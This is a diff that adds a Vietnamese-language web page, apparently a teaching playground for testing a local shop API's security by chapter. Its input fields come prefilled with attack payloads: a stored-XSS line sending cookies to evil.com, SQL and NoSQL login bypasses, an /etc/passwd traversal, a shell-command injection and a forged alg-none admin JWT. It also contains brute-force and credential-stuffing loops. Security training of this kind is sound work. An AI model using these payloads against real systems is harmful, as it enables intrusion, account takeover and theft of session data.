@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>API Security Testing Playground</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; display: flex; }
+.sidebar { width: 260px; min-height: 100vh; background: #161b22; border-right: 1px solid #30363d; padding: 16px 0; position: fixed; top: 0; left: 0; overflow-y: auto; z-index: 100; }
+.sidebar h1 { font-size: 16px; padding: 0 16px 16px; color: #58a6ff; border-bottom: 1px solid #30363d; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+.sidebar h1 small { font-size: 11px; color: #8b949e; font-weight: normal; }
+.sidebar .chapter { padding: 8px 16px; cursor: pointer; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #8b949e; transition: all .15s; border-left: 3px solid transparent; }
+.sidebar .chapter:hover { background: #1c2129; color: #c9d1d9; }
+.sidebar .chapter.active { color: #58a6ff; background: #1c2129; border-left-color: #58a6ff; font-weight: 600; }
+.sidebar .chapter .num { font-size: 11px; color: #484f58; min-width: 18px; }
+.main { margin-left: 260px; flex: 1; padding: 24px; max-width: calc(100% - 260px); }
+.section { display: none; }
+.section.active { display: block; }
+.section h2 { font-size: 22px; color: #f0f6fc; margin-bottom: 4px; }
+.section .desc { color: #8b949e; font-size: 13px; margin-bottom: 24px; }
+.card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
+.card-title { padding: 12px 16px; font-size: 14px; font-weight: 600; background: #1c2129; border-bottom: 1px solid #30363d; display: flex; align-items: center; gap: 8px; justify-content: space-between; }
+.card-title .badge { font-size: 11px; padding: 2px 8px; border-radius: 10px; font-weight: 500; }
+.badge.get { background: #1f6feb33; color: #58a6ff; }
+.badge.post { background: #23863633; color: #3fb950; }
+.badge.put { background: #d2992233; color: #d29922; }
+.badge.delete { background: #da363333; color: #f85149; }
+.card-body { padding: 16px; }
+.url-bar { display: flex; gap: 8px; margin-bottom: 12px; align-items: stretch; }
+.url-bar .method { padding: 6px 14px; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: #c9d1d9; font-size: 13px; font-weight: 600; cursor: pointer; min-width: 80px; text-align: center; }
+.url-bar .method.get { color: #58a6ff; border-color: #1f6feb; }
+.url-bar .method.post { color: #3fb950; border-color: #238636; }
+.url-bar .method.put { color: #d29922; border-color: #d29922; }
+.url-bar .method.delete { color: #f85149; border-color: #da3633; }
+.url-bar input[type="text"] { flex: 1; padding: 6px 12px; border: 1px solid #30363d; border-radius: 6px; background: #0d1117; color: #c9d1d9; font-size: 13px; font-family: 'Consolas', monospace; }
+.url-bar input[type="text"]:focus { outline: none; border-color: #58a6ff; }
+.btn { padding: 6px 16px; border: 1px solid #30363d; border-radius: 6px; background: #21262d; color: #c9d1d9; cursor: pointer; font-size: 13px; transition: all .15s; white-space: nowrap; }
+.btn:hover { background: #30363d; }
+.btn.primary { background: #238636; border-color: #238636; color: #fff; }
+.btn.primary:hover { background: #2ea043; }
+.btn.danger { background: #da3633; border-color: #da3633; color: #fff; }
+.btn.danger:hover { background: #f85149; }
+.btn.warning { background: #d29922; border-color: #d29922; color: #fff; }
+.btn.warning:hover { background: #e3b341; }
+.btn:disabled { opacity: .5; cursor: not-allowed; }
+.url-bar .btn { border-radius: 6px; }
+.params-area { margin-bottom: 12px; }
+.params-area textarea, .params-area input:not([type="checkbox"]), .params-area select { width: 100%; padding: 8px 12px; border: 1px solid #30363d; border-radius: 6px; background: #0d1117; color: #c9d1d9; font-size: 13px; font-family: 'Consolas', monospace; margin-bottom: 8px; }
+.params-area textarea { min-height: 80px; resize: vertical; }
+.params-area textarea:focus, .params-area select:focus { outline: none; border-color: #58a6ff; }
+.params-area select { cursor: pointer; }
+.params-area label { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #8b949e; margin-bottom: 8px; cursor: pointer; }
+.params-area label input[type="checkbox"] { accent-color: #58a6ff; }
+.response-area { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin-top: 12px; }
+.response-area .resp-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+.response-area .resp-header .status { font-weight: 600; font-size: 13px; }
+.response-area .resp-header .status .code { padding: 2px 8px; border-radius: 4px; font-size: 12px; }
+.response-area .resp-header .status .code.good { background: #23863633; color: #3fb950; }
+.response-area .resp-header .status .code.bad { background: #da363333; color: #f85149; }
+.response-area .resp-header .status .code.warn { background: #d2992233; color: #d29922; }
+.response-area .resp-header .time { color: #8b949e; font-size: 12px; }
+.response-area pre { font-size: 12px; line-height: 1.5; max-height: 300px; overflow: auto; white-space: pre-wrap; word-break: break-all; color: #c9d1d9; }
+.response-area pre .key { color: #79c0ff; }
+.response-area pre .string { color: #a5d6ff; }
+.response-area pre .number { color: #79c0ff; }
+.response-area pre .bool { color: #ff7b72; }
+.response-area pre .null { color: #8b949e; }
+.token-bar { position: fixed; top: 0; right: 0; left: 260px; background: #161b22; border-bottom: 1px solid #30363d; padding: 8px 24px; display: flex; align-items: center; gap: 12px; z-index: 99; }
+.token-bar .label { font-size: 12px; color: #8b949e; white-space: nowrap; }
+.token-bar input { flex: 1; padding: 4px 10px; border: 1px solid #30363d; border-radius: 6px; background: #0d1117; color: #c9d1d9; font-size: 12px; font-family: 'Consolas', monospace; }
+.token-bar input:focus { outline: none; border-color: #58a6ff; }
+.token-bar .user-info { font-size: 12px; color: #3fb950; white-space: nowrap; }
+.main-content { margin-top: 48px; }
+.param-row { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; }
+.param-row input { flex: 1; }
+.param-row .btn-remove { padding: 2px 8px; font-size: 16px; line-height: 1; }
+.add-param-btn { font-size: 12px; color: #58a6ff; cursor: pointer; background: none; border: none; padding: 4px 0; }
+.add-param-btn:hover { text-decoration: underline; }
+.attack-tip { background: #1c2129; border-left: 3px solid #d29922; padding: 8px 12px; margin-bottom: 12px; font-size: 12px; color: #d29922; border-radius: 0 6px 6px 0; }
+.attack-tip.success { border-left-color: #3fb950; color: #3fb950; }
+.attack-tip.danger { border-left-color: #f85149; color: #f85149; }
+.inline-group { display: flex; gap: 8px; align-items: flex-start; }
+.inline-group > * { flex: 1; }
+@media (max-width: 768px) {
+  .sidebar { width: 200px; }
+  .main { margin-left: 200px; max-width: calc(100% - 200px); }
+  .token-bar { left: 200px; }
+}
+</style>
+</head>
+<body>
+
+<div class="sidebar">
+  <h1>🛡️ Security API Tester <small>v1.0</small></h1>
+  <div class="chapter active" data-section="auth"><span class="num">🔑</span> Authentication</div>
+  <div class="chapter" data-section="html-injection"><span class="num">Ch.2</span> HTML Injection</div>
+  <div class="chapter" data-section="xss"><span class="num">Ch.3</span> XSS</div>
+  <div class="chapter" data-section="sqli"><span class="num">Ch.4</span> SQL Injection</div>
+  <div class="chapter" data-section="auth-vuln"><span class="num">Ch.5</span> Auth Vulnerabilities</div>
+  <div class="chapter" data-section="session"><span class="num">Ch.6</span> Session & Cookie</div>
+  <div class="chapter" data-section="csrf"><span class="num">Ch.8</span> CSRF</div>
+  <div class="chapter" data-section="file-upload"><span class="num">Ch.9</span> File Upload</div>
+  <div class="chapter" data-section="path-traversal"><span class="num">Ch.10</span> Path Traversal & CMDi</div>
+  <div class="chapter" data-section="jwt"><span class="num">Ch.12</span> API & JWT Security</div>
+</div>
+
+<div class="main">
+  <div class="token-bar">
+    <span class="label">🔑 JWT Token:</span>
+    <input type="text" id="tokenInput" placeholder="Paste your JWT token here..." spellcheck="false">
+    <span class="user-info" id="userInfo"></span>
+    <button class="btn" onclick="decodeToken()">Decode</button>
+    <button class="btn danger" onclick="clearToken()">Clear</button>
+  </div>
+
+  <div class="main-content">
+    <!-- Section: Authentication -->
+    <div class="section active" id="section-auth">
+      <h2>🔑 Authentication</h2>
+      <p class="desc">Đăng ký, đăng nhập và lấy thông tin user. Dùng để lấy JWT token cho các API test khác.</p>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge post">POST</span> /api/auth/register</span> <span style="font-size:12px;color:#8b949e;">Đăng ký tài khoản</span></div>
+        <div class="card-body">
+          <div class="params-area">
+            <input type="text" id="reg-name" placeholder="name" value="testuser">
+            <input type="text" id="reg-email" placeholder="email" value="test@test.com">
+            <input type="text" id="reg-pass" placeholder="password" value="123456">
+          </div>
+          <div class="inline-group">
+            <button class="btn primary" onclick="apiCall('POST','/api/auth/register',{name:g('reg-name'),email:g('reg-email'),password:g('reg-pass')},'reg-resp')">Register</button>
+          </div>
+          <div class="response-area" id="reg-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge post">POST</span> /api/auth/login</span> <span style="font-size:12px;color:#8b949e;">Đăng nhập (admin/123)</span></div>
+        <div class="card-body">
+          <div class="params-area">
+            <input type="text" id="login-email" placeholder="email" value="admin">
+            <input type="text" id="login-pass" placeholder="password" value="123">
+          </div>
+          <div class="inline-group">
+            <button class="btn primary" onclick="login()">Login</button>
+            <button class="btn warning" onclick="document.getElementById('login-email').value='admin';document.getElementById('login-pass').value='123'">Fill Admin</button>
+          </div>
+          <div class="response-area" id="login-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge get">GET</span> /api/auth/me</span> <span style="font-size:12px;color:#8b949e;">Lấy thông tin user từ token</span></div>
+        <div class="card-body">
+          <button class="btn primary" onclick="apiCall('GET','/api/auth/me',null,'me-resp',true)">Get Me</button>
+          <div class="response-area" id="me-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: HTML Injection -->
+    <div class="section" id="section-html-injection">
+      <h2>🖊️ HTML Injection (Ch.2)</h2>
+      <p class="desc">Chèn HTML độc hại vào các trường dữ liệu. Server có dùng <code>stripHtml</code> / <code>escapeHtml</code> để bảo vệ.</p>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge post">POST</span> /api/products — HTML Injection trong name</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Payload: <code>&lt;h1&gt;INJECTED&lt;/h1&gt;&lt;img src=x onerror=alert('XSS')&gt;</code></div>
+          <div class="params-area">
+            <input type="text" id="html-name" value='<h1>INJECTED</h1><img src=x onerror=alert("XSS")>'>
+            <input type="text" id="html-desc" value='<script>alert("hacked")</script>'>
+            <input type="text" id="html-price" value="100">
+            <select id="html-cat"><option>Men</option><option>Women</option><option>Kids</option></select>
+            <select id="html-subcat"><option>Topwear</option><option>Bottomwear</option><option>Winterwear</option></select>
+          </div>
+          <button class="btn primary" onclick="apiCall('POST','/api/products',{name:g('html-name'),description:g('html-desc'),price:Number(g('html-price')),category:g('html-cat'),subCategory:g('html-subcat')},'html-resp',true,'admin')">Test HTML Injection</button>
+          <div class="response-area" id="html-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: XSS -->
+    <div class="section" id="section-xss">
+      <h2>⚠️ Cross-Site Scripting (XSS) (Ch.3)</h2>
+      <p class="desc">Các dạng tấn công XSS: Reflected, Stored, DOM-based.</p>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge post">POST</span> /api/products — Stored XSS</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Stored XSS: Dữ liệu độc hại lưu vào database, hiển thị khi người khác xem.</div>
+          <div class="params-area">
+            <input type="text" id="sxss-name" value='<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>'>
+            <input type="text" id="sxss-price" value="50">
+          </div>
+          <button class="btn primary" onclick="apiCall('POST','/api/products',{name:g('sxss-name'),price:Number(g('sxss-price'))},'sxss-resp',true,'admin')">Test Stored XSS</button>
+          <div class="response-area" id="sxss-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge get">GET</span> /api/products — Reflected XSS (query params)</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Reflected XSS: Payload trong URL, server反射 về response.</div>
+          <div class="params-area">
+            <input type="text" id="rxss-url" value="/api/products?search=<script>alert('XSS')</script>">
+          </div>
+          <button class="btn primary" onclick="apiCall('GET',g('rxss-url'),null,'rxss-resp')">Test Reflected XSS</button>
+          <div class="response-area" id="rxss-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: SQL Injection -->
+    <div class="section" id="section-sqli">
+      <h2>🗄️ SQL Injection (Ch.4)</h2>
+      <p class="desc">Server dùng JSON file (NoSQL), nhưng có thể test các kỹ thuật bypass login, injection qua API.</p>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge post">POST</span> /api/auth/login — Bypass Login</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 Test các payload bypass login phổ biến (dù server không dùng SQL, nhưng test cách xử lý input).</div>
+          <div class="params-area">
+            <label><input type="checkbox" id="sqli-bypass-list"> Dùng danh sách brute force</label>
+          </div>
+          <div class="inline-group">
+            <input type="text" id="sqli-email" value="admin' OR '1'='1">
+            <input type="text" id="sqli-pass" value="' OR '1'='1">
+          </div>
+          <button class="btn primary" onclick="apiCall('POST','/api/auth/login',{email:g('sqli-email'),password:g('sqli-pass')},'sqli-resp')">Test Bypass</button>
+          <div class="response-area" id="sqli-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge post">POST</span> /api/auth/login — NoSQL Injection ($ne)</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 NoSQL Injection: Dùng toán tử <code>$ne</code> để bypass nếu server dùng MongoDB.</div>
+          <div class="params-area">
+            <input type="text" id="nosql-body" value='{"email":{"$ne":""},"password":{"$ne":""}}'>
+          </div>
+          <button class="btn warning" onclick="apiCallRaw('/api/auth/login',g('nosql-body'),'nosql-resp')">Test NoSQL Injection</button>
+          <div class="response-area" id="nosql-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: Auth Vulnerabilities -->
+    <div class="section" id="section-auth-vuln">
+      <h2>🔓 Authentication Vulnerabilities (Ch.5)</h2>
+      <p class="desc">Weak password, Brute force, Credential stuffing. Server có rate limiting (10 requests/15min cho /api/auth/login).</p>
+
+      <div class="card">
+        <div class="card-title"><span>🔨 Brute Force Attack</span></div>
+        <div class="card-body">
+          <div class="attack-tip">⚡ Server giới hạn 10 requests/15 phút cho <code>/api/auth/login</code>. Hãy test rate limiting.</div>
+          <div class="params-area">
+            <input type="text" id="bf-email" value="admin">
+            <input type="text" id="bf-passwords" value='["123","1234","12345","password","admin","111111","abc123","qwerty"]'>
+          </div>
+          <button class="btn warning" onclick="bruteForce()">Brute Force Test</button>
+          <div class="response-area" id="bf-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span>🧂 Credential Stuffing</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 Dùng danh sách email/mật khẩu bị rò rỉ để đăng nhập.</div>
+          <div class="params-area">
+            <input type="text" id="cs-list" value='[{"email":"admin","pass":"123"},{"email":"user@test.com","pass":"123456"},{"email":"admin@shop.com","pass":"admin123"}]'>
+          </div>
+          <button class="btn warning" onclick="credStuffing()">Test Credential Stuffing</button>
+          <div class="response-area" id="cs-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span>🔐 Weak Password Policy</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 Server yêu cầu password 4-128 ký tự. Test các password yếu.</div>
+          <div class="params-area">
+            <input type="text" id="wp-email" value="weakuser@test.com">
+            <input type="text" id="wp-pass" value="1234">
+          </div>
+          <button class="btn primary" onclick="apiCall('POST','/api/auth/register',{name:'weakuser',email:g('wp-email'),password:g('wp-pass')},'wp-resp')">Test Weak Password</button>
+          <div class="response-area" id="wp-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: Session & Cookie -->
+    <div class="section" id="section-session">
+      <h2>🍪 Session & Cookie Security (Ch.6)</h2>
+      <p class="desc">Session hijacking, Session fixation. JWT token bị đánh cắp có thể dùng để mạo danh.</p>
+
+      <div class="card">
+        <div class="card-title"><span>🕵️ Session Hijacking</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Dùng token của người khác (nếu đánh cắp được) để truy cập tài khoản.</div>
+          <div class="params-area">
+            <input type="text" id="hijack-token" placeholder="Dán stolen token vào thanh JWT Token ở trên">
+          </div>
+          <button class="btn danger" onclick="showHijackDemo()">Test Session Hijacking</button>
+          <div class="response-area" id="hijack-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span>🔒 Token Expiration</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 JWT token hết hạn sau 1 ngày. Test xem token hết hạn có dùng được không?</div>
+          <div class="params-area">
+            <input type="text" id="exp-token" placeholder="Dán token cũ (đã hết hạn)">
+          </div>
+          <button class="btn warning" onclick="testExpiredToken()">Test Expired Token</button>
+          <div class="response-area" id="exp-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: CSRF -->
+    <div class="section" id="section-csrf">
+      <h2>🌐 Cross-Site Request Forgery (CSRF) (Ch.8)</h2>
+      <p class="desc">GET-based CSRF, POST-based CSRF. Server dùng JWT token trong header (không dùng cookie), nên CSRF ít hiệu quả hơn.</p>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge get">GET</span> GET-based CSRF — Xóa sản phẩm</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Nếu API dùng GET để xóa, attacker có thể tạo link &lt;img&gt; để trigger.</div>
+          <div class="params-area">
+            <input type="text" id="csrf-get-url" value="/api/products/aaaaz">
+          </div>
+          <button class="btn danger" onclick="apiCall('GET',g('csrf-get-url'),null,'csrf-get-resp',true,'admin')">Test GET CSRF</button>
+          <div class="response-area" id="csrf-get-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge post">POST</span> POST-based CSRF — Tạo sản phẩm</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 Server kiểm tra <code>Authorization</code> header. POST CSRF chỉ thành công nếu có token hợp lệ.</div>
+          <div class="params-area">
+            <input type="text" id="csrf-post-name" value="CSRF Product">
+            <input type="text" id="csrf-post-price" value="999">
+          </div>
+          <button class="btn warning" onclick="apiCall('POST','/api/products',{name:g('csrf-post-name'),price:Number(g('csrf-post-price'))},'csrf-post-resp',true,'admin')">Test POST CSRF</button>
+          <div class="response-area" id="csrf-post-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: File Upload -->
+    <div class="section" id="section-file-upload">
+      <h2>📁 File Upload Security (Ch.9)</h2>
+      <p class="desc">Upload webshell, MIME spoofing, Extension bypass.</p>
+
+      <div class="card">
+        <div class="card-title"><span>📤 Upload File</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Test upload file độc hại (webshell PHP, MIME spoofing). Server hiện chưa có endpoint upload file.</div>
+          <div class="params-area">
+            <input type="file" id="upload-file" disabled>
+            <p style="color:#8b949e;font-size:12px;margin-top:8px;">⚠️ Server hiện không có endpoint upload file. Đây là lỗ hổng bảo mật cần được thêm vào.</p>
+          </div>
+          <button class="btn" disabled>Upload (Coming Soon)</button>
+          <div class="response-area" id="upload-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: Path Traversal & Command Injection -->
+    <div class="section" id="section-path-traversal">
+      <h2>📂 Path Traversal & Command Injection (Ch.10)</h2>
+      <p class="desc">Path traversal đọc file ngoài thư mục cho phép, OS command injection chạy lệnh hệ thống.</p>
+
+      <div class="card">
+        <div class="card-title"><span>📂 Path Traversal</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Payload: <code>../../../etc/passwd</code>, <code>..\..\..\windows\system32\drivers\etc\hosts</code></div>
+          <div class="params-area">
+            <input type="text" id="pt-path" value="../../../etc/passwd">
+          </div>
+          <button class="btn danger" onclick="apiCall('GET','/api/products/'+encodeURIComponent(g('pt-path')),null,'pt-resp')">Test Path Traversal</button>
+          <div class="response-area" id="pt-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span>⌨️ OS Command Injection</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Payload: <code>; ls -la /</code>, <code>| dir</code>, <code>& echo hacked</code></div>
+          <div class="params-area">
+            <input type="text" id="cmdi-payload" value="'; ls -la /;'">
+            <input type="text" id="cmdi-field" value="name">
+          </div>
+          <button class="btn danger" onclick="apiCall('POST','/api/products',{name:g('cmdi-payload'),price:100,description:'<'+g('cmdi-field')+'>'},'cmdi-resp',true,'admin')">Test Command Injection</button>
+          <div class="response-area" id="cmdi-resp"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Section: API & JWT Security -->
+    <div class="section" id="section-jwt">
+      <h2>🔐 API & JWT Security (Ch.12)</h2>
+      <p class="desc">Missing Authentication, BOLA (Broken Object Level Authorization), Bypass auth, Brute force secret key.</p>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge get">GET</span> /api/users/all — Missing Auth Test</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 Endpoint này yêu cầu adminAuth. Test gọi mà không có token.</div>
+          <button class="btn danger" onclick="apiCall('GET','/api/users/all',null,'bola-resp')">Test No Auth</button>
+          <div class="response-area" id="bola-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span><span class="badge get">GET</span> /api/orders/all — BOLA (Leak all orders)</span></div>
+        <div class="card-body">
+          <div class="attack-tip danger">💉 BOLA: User thường không được xem đơn hàng của người khác. Test với user token.</div>
+          <button class="btn warning" onclick="apiCall('GET','/api/orders/all',null,'bola2-resp',true)">Test BOLA (user token)</button>
+          <div class="response-area" id="bola2-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span>🔑 JWT Secret Key Brute Force</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 Nếu JWT secret yếu, attacker có thể brute force để ký token giả mạo.</div>
+          <div class="params-area">
+            <input type="text" id="jwt-token-to-crack" placeholder="Paste JWT token cần crack">
+          </div>
+          <button class="btn warning" onclick="alert('Tính năng này decode JWT ở client side, xem payload.\nKhông thực sự brute force secret (cần thư viện bên ngoài).')">Decode JWT (xem payload)</button>
+          <div class="response-area" id="jwt-crack-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span>🔄 JWT Token Forgery</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 Test "none" algorithm attack: Server có chấp nhận JWT với alg: "none" không?</div>
+          <div class="params-area">
+            <textarea id="forgery-jwt" rows="3">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjEiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDB9.</textarea>
+          </div>
+          <button class="btn danger" onclick="testForgedToken()">Test None Algorithm Attack</button>
+          <div class="response-area" id="forgery-resp"></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title"><span>🔍 JWT Secret Weakness</span></div>
+        <div class="card-body">
+          <div class="attack-tip">💡 Server dùng <code>crypto.randomBytes(64).toString('hex')</code> nếu không có env JWT_SECRET — rất mạnh. Nhưng nếu env dùng secret yếu như "secret" hay "123", có thể brute force.</div>
+          <p style="font-size:13px;color:#8b949e;">Kiểm tra file <code>.env</code> hoặc <code>server/middleware/auth.js:8</code> để xem JWT_SECRET có được cấu hình đúng không.</p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const BASE = '';
+let currentToken = '';
+
+document.getElementById('tokenInput').addEventListener('input', function() {
+  currentToken = this.value.trim();
+  updateUserInfo();
+});
+
+function g(id) { return document.getElementById(id).value; }
+
+function decodeToken() {
+  const t = currentToken;
+  if (!t) return;
+  try {
+    const parts = t.split('.');
+    const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+    document.getElementById('userInfo').textContent = `👤 ${JSON.stringify(payload)}`;
+  } catch(e) {
+    document.getElementById('userInfo').textContent = '⚠️ Invalid token';
+  }
+}
+
+function updateUserInfo() {
+  if (!currentToken) { document.getElementById('userInfo').textContent = ''; return; }
+  try {
+    const parts = currentToken.split('.');
+    const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+    document.getElementById('userInfo').textContent = `👤 id:${payload.id} role:${payload.role}`;
+  } catch(e) { document.getElementById('userInfo').textContent = '⚠️'; }
+}
+
+function clearToken() {
+  document.getElementById('tokenInput').value = '';
+  currentToken = '';
+  document.getElementById('userInfo').textContent = '';
+}
+
+function setToken(token) {
+  document.getElementById('tokenInput').value = token;
+  currentToken = token;
+  updateUserInfo();
+}
+
+function showResp(elId, status, data, time) {
+  const el = document.getElementById(elId);
+  const cls = status < 300 ? 'good' : status < 500 ? 'warn' : 'bad';
+  let body = '';
+  if (typeof data === 'string') {
+    body = escapeHtml(data);
+  } else {
+    body = syntaxHighlight(JSON.stringify(data, null, 2));
+  }
+  el.innerHTML = `<div class="resp-header"><span class="status">Status: <span class="code ${cls}">${status}</span></span><span class="time">${time}ms</span></div><pre>${body}</pre>`;
+}
+
+function syntaxHighlight(json) {
+  return json.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"([^"]+)":/g,'<span class="key">"$1"</span>:')
+    .replace(/: "([^"]*)"/g,': <span class="string">"$1"</span>')
+    .replace(/: (\d+\.?\d*)/g,': <span class="number">$1</span>')
+    .replace(/: (true|false)/g,': <span class="bool">$1</span>')
+    .replace(/: (null)/g,': <span class="null">$1</span>');
+}
+
+function escapeHtml(s) {
+  const d = document.createElement('div');
+  d.textContent = s;
+  return d.innerHTML;
+}
+
+async function apiCall(method, url, body, respId, useToken, requiredRole) {
+  const start = Date.now();
+  const headers = { 'Content-Type': 'application/json' };
+  if (useToken && currentToken) {
+    headers['Authorization'] = 'Bearer ' + currentToken;
+  }
+  const opts = { method, headers };
+  if (body) opts.body = JSON.stringify(body);
+
+  try {
+    const res = await fetch(BASE + url, opts);
+    const time = Date.now() - start;
+    let data;
+    const ct = res.headers.get('content-type') || '';
+    if (ct.includes('application/json')) {
+      data = await res.json();
+    } else {
+      data = await res.text();
+    }
+    showResp(respId, res.status, data, time);
+  } catch(e) {
+    showResp(respId, 0, 'Network Error: ' + e.message, Date.now() - start);
+  }
+}
+
+async function apiCallRaw(url, bodyStr, respId) {
+  const start = Date.now();
+  try {
+    const body = JSON.parse(bodyStr);
+    const res = await fetch(BASE + url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const time = Date.now() - start;
+    const data = await res.json();
+    showResp(respId, res.status, data, time);
+  } catch(e) {
+    showResp(respId, 0, 'Error: ' + e.message, Date.now() - start);
+  }
+}
+
+async function login() {
+  const start = Date.now();
+  const email = g('login-email');
+  const password = g('login-pass');
+  try {
+    const res = await fetch(BASE + '/api/auth/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password })
+    });
+    const time = Date.now() - start;
+    const data = await res.json();
+    showResp('login-resp', res.status, data, time);
+    if (data.token) {
+      setToken(data.token);
+    }
+  } catch(e) {
+    showResp('login-resp', 0, 'Network Error: ' + e.message, Date.now() - start);
+  }
+}
+
+async function bruteForce() {
+  const el = document.getElementById('bf-resp');
+  const email = g('bf-email');
+  let passwords;
+  try { passwords = JSON.parse(g('bf-passwords')); } catch(e) { passwords = g('bf-passwords').split(','); }
+  el.innerHTML = '<div class="resp-header"><span>⏳ Đang thử ' + passwords.length + ' passwords...</span></div>';
+  for (let i = 0; i < passwords.length; i++) {
+    const start = Date.now();
+    try {
+      const res = await fetch(BASE + '/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password: passwords[i] })
+      });
+      const data = await res.json();
+      const time = Date.now() - start;
+      if (res.ok) {
+        el.innerHTML += `<div style="color:#3fb950;font-size:12px;margin-top:4px;">✅ [${i+1}] "${passwords[i]}" → SUCCESS (${time}ms) Token: ${(data.token||'').slice(0,30)}...</div>`;
+        if (data.token) setToken(data.token);
+        break;
+      } else if (res.status === 429) {
+        el.innerHTML += `<div style="color:#d29922;font-size:12px;margin-top:4px;">⛔ [${i+1}] "${passwords[i]}" → RATE LIMITED (429)</div>`;
+        break;
+      } else {
+        el.innerHTML += `<div style="color:#8b949e;font-size:12px;margin-top:4px;">❌ [${i+1}] "${passwords[i]}" → ${data.message || 'Failed'} (${time}ms)</div>`;
+      }
+    } catch(e) {
+      el.innerHTML += `<div style="color:#f85149;font-size:12px;margin-top:4px;">⚠️ Error: ${e.message}</div>`;
+      break;
+    }
+    await new Promise(r => setTimeout(r, 200));
+  }
+}
+
+async function credStuffing() {
+  const el = document.getElementById('cs-resp');
+  let creds;
+  try { creds = JSON.parse(g('cs-list')); } catch(e) { creds = []; }
+  el.innerHTML = '<div class="resp-header"><span>⏳ Đang thử ' + creds.length + ' credentials...</span></div>';
+  for (let i = 0; i < creds.length; i++) {
+    const start = Date.now();
+    try {
+      const res = await fetch(BASE + '/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: creds[i].email, password: creds[i].pass })
+      });
+      const data = await res.json();
+      const time = Date.now() - start;
+      if (res.ok) {
+        el.innerHTML += `<div style="color:#3fb950;font-size:12px;margin-top:4px;">✅ [${i+1}] ${creds[i].email}:${creds[i].pass} → SUCCESS (${time}ms)</div>`;
+      } else {
+        el.innerHTML += `<div style="color:#8b949e;font-size:12px;margin-top:4px;">❌ [${i+1}] ${creds[i].email}:${creds[i].pass} → ${data.message} (${time}ms)</div>`;
+      }
